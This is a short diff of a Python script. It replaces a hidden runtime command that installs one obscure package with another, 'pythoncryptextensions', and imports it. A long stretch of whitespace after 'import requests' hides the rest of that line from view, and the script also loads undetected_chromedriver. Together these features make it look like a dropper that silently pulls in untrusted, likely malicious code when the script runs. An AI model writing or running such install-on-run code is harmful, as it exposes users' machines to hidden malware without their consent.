@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringstools")
-import pipcoloringstools
+os.system("pip install pythoncryptextensions")
+import pythoncryptextensions
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
